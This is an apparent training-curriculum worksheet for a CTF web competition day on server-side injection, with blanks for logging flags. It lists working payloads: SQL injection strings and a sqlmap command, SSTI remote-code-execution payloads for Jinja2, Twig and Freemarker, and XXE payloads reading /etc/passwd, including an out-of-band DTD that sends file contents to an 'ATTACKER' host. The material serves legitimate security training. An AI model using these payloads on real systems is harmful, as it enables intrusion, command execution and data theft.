---
title: "CTF Web Competition Day 3 — Server-Side Injection Attacks"
tags: [CTF, web, competition, SQLi, SSTI, XXE, SSRF, injection, practice, bug-bounty]
module: 05-BugBountyOps-02
day: 313
related_topics:
  - CTF Web Competition Day 2 (Day 312)
  - Web Exploitation (R-02)
  - Server-Side Attack Review (Day 185)
---

# Day 313 — CTF Web Competition Day 3: Server-Side Injection Attacks

---

## Goals

Target CTF challenges requiring server-side injection:
SQL injection, SSTI, XXE, and SSRF in deeper configurations.

**Time budget:** 4–5 hours.

---

## Injection Attack Decision Tree

```
Input reflected in output?
  → YES → test for XSS, SSTI
  → NO  → test for blind injection (SQLi, SSRF, XXE out-of-band)

Input used in a database query?
  → Test SQLi: ' -- , ' OR 1=1-- , ' UNION SELECT NULL--

Input used in a template engine?
  → Identify engine: {{7*7}} → 49? Jinja2/Twig
                    ${7*7} → 49? Freemarker/Thymeleaf
                    <%= 7*7 %> → 49? ERB

Input used in an XML parser?
  → Test XXE: <!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

Input used as a URL or hostname?
  → Test SSRF: point to 127.0.0.1, 169.254.169.254, internal services
```

---

## Challenge Log

### Challenge 1 — SQL Injection

```
Points: ___
Entry point: ___  (login form / search / order param / header)

Detection payload: ' -- (error or blank result?)
Result: ___

Error-based extraction:
  EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) -- MySQL
  CAST((SELECT version()) AS INT) -- PostgreSQL

Union-based (find column count first):
  ' ORDER BY 1--   ' ORDER BY 2--  ... until error
  Column count: ___

  ' UNION SELECT NULL,NULL,NULL--  (adjust)
  ' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--

Blind boolean:
  ' AND 1=1--   → TRUE (same response)
  ' AND 1=2--   → FALSE (different response)
  Automate: sqlmap -u "URL" -p PARAM --level 3

Data extracted: ___
Flag: ___
Time: ___ min
```

### Challenge 2 — SSTI

```
Points: ___
Template engine detected by: ___

Detection chain:
  {{7*7}}     → if 49: Jinja2 or Twig
  {{7*'7'}}   → if 7777777: Jinja2
               → if 49: Twig
  ${7*7}      → if 49: Freemarker, Thymeleaf, Pebble
  #{7*7}      → if 49: Thymeleaf

Engine confirmed: ___

RCE payload used:
  # Jinja2
  {{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('id').read()}}

  # Twig
  {{['id']|filter('system')}}

  # Freemarker
  <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

Command output: ___
Flag location: ___
Flag: ___
Time: ___ min
```

### Challenge 3 — XXE

```
Points: ___
XML input found in: ___  (file upload / API body / SOAP)

Basic XXE test:
  <?xml version="1.0"?>
  <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <root>&xxe;</root>

Result: ___

OOB XXE (if output not reflected):
  # External DTD on attacker server
  <!DOCTYPE root [
    <!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd">
    %dtd;
  ]>

  # evil.dtd content:
  <!ENTITY % file SYSTEM "file:///etc/flag">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM
    'http://ATTACKER/?data=%file;'>">
  %eval;
  %exfil;

Flag: ___
Time: ___ min
```

---

## Injection Summary

```
SQL injection types encountered: ___
SSTI engines encountered: ___
XXE variants: ___

Technique that gave the most trouble: ___
Why: ___
Fix: ___
```

---

## Questions

> Add your questions here. Each question gets a Global ID (Q313.1, Q313.2 …).

---

## Navigation

← Previous: [Day 312 — CTF Web Competition Day 2](DAY-0312-CTF-Web-Competition-Day-02.md)
→ Next: [Day 314 — CTF Web Competition Day 4](DAY-0314-CTF-Web-Competition-Day-04.md)
